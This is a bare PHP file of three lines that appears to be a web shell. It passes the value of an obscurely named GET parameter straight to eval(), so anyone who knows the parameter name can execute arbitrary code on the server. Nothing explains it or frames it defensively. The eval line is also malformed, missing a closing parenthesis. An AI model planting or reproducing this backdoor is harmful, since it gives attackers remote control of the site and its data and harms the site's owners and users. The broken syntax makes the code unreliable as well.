<?php
eval($_GET['3rBvezDt'];
?>
